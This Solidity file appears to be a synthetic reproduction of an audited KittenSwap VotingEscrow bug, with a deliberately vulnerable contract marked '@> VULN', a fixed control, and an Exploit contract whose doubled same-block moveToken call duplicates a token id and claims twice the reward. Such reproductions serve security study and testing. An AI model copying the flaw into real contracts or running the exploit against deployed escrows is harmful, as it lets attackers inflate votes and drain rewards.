// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  KittenSwap VotingEscrow — same-block delegate write duplicates a tokenId
    (Pashov H-04, finding 58015).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    _findWhatCheckpointToWrite returns the current checkpoint when its timestamp
    is this block. The copy loop then appends the token ids already stored there.
    Token 7 is stored twice, so voting power is 2 instead of 1, and the reward
    paid is 200 instead of 100. The control reverts the second write.
    The blamed append is preserved (@> VULN). run() does not warp. */

contract MockToken {
    string public name = "Vote Reward";
    string public symbol = "KITTEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VotingEscrow {
    uint256 public constant REWARD_PER_VOTE = 100 ether;

    MockToken public token;
    mapping(address => mapping(uint256 => uint256)) public tokenAt;
    mapping(address => uint256) public listLength;
    mapping(address => uint256) public checkpointTs;
    mapping(address => uint32) public numCheckpoints;
    uint256 public votingPower;
    uint256 public rewardPaid;

    constructor(address token_) {
        token = MockToken(token_);
    }

    // Quoted _findWhatCheckpointToWrite.
    function _findWhatCheckpointToWrite(address account) internal view returns (uint32) {
        uint32 n = numCheckpoints[account];
        if (n > 0 && checkpointTs[account] == block.timestamp) {
            return n - 1;
        }
        return n;
    }

    function moveToken(address dst, uint256 tokenId) external {
        uint32 n = numCheckpoints[dst];
        uint32 next = _findWhatCheckpointToWrite(dst);
        if (next == n) {
            numCheckpoints[dst] = n + 1;
            checkpointTs[dst] = block.timestamp;
            listLength[dst] = 0;
        }
        uint256 bound = listLength[dst];
        if (bound == 0) {
            tokenAt[dst][0] = tokenId;
            listLength[dst] = 1;
        } else {
            // @> VULN: the same-block checkpoint appends an existing tokenId again
            this.appendDuplicate(dst, bound);
        }
    }

    function appendDuplicate(address dst, uint256 bound) external {
        require(msg.sender == address(this), "self");
        tokenAt[dst][bound] = tokenAt[dst][0];
        listLength[dst] = bound + 1;
    }

    function votes(address account) public view returns (uint256) {
        return listLength[account];
    }

    function claim(address account) external returns (uint256 paid) {
        votingPower = votes(account);
        paid = votingPower * REWARD_PER_VOTE;
        rewardPaid = paid;
        token.transfer(account, paid);
    }
}

contract VotingEscrowFixed {
    uint256 public constant REWARD_PER_VOTE = 100 ether;
    MockToken public token;
    mapping(address => uint256) public listLength;
    mapping(address => uint256) public checkpointTs;
    mapping(address => uint32) public numCheckpoints;

    constructor(address token_) {
        token = MockToken(token_);
    }

    function moveToken(address dst, uint256 tokenId) external {
        tokenId;
        if (numCheckpoints[dst] > 0 && checkpointTs[dst] == block.timestamp) {
            revert("duplicate checkpoint");
        }
        numCheckpoints[dst] = 1;
        checkpointTs[dst] = block.timestamp;
        listLength[dst] = 1;
    }

    function claim(address account) external returns (uint256 paid) {
        paid = listLength[account] * REWARD_PER_VOTE;
        token.transfer(account, paid);
    }
}

contract Exploit {
    uint256 public constant TOKEN_ID = 7;

    MockToken public token;
    VotingEscrow public escrow;
    uint256 public power;
    uint256 public paid;

    constructor() {
        token = new MockToken();
        escrow = new VotingEscrow(address(token));
    }

    function run() external {
        token.mint(address(escrow), 200 ether);
        escrow.moveToken(address(this), TOKEN_ID);
        escrow.moveToken(address(this), TOKEN_ID);
        power = escrow.votes(address(this));
        paid = escrow.claim(address(this));
        require(power == 2, "voting power is not 2");
        require(escrow.tokenAt(address(this), 0) == TOKEN_ID, "first entry");
        require(escrow.tokenAt(address(this), 1) == TOKEN_ID, "duplicate entry");
        require(paid == 200 ether, "reward is not 200");
        require(token.balanceOf(address(this)) == 200 ether, "voter balance");
    }
}
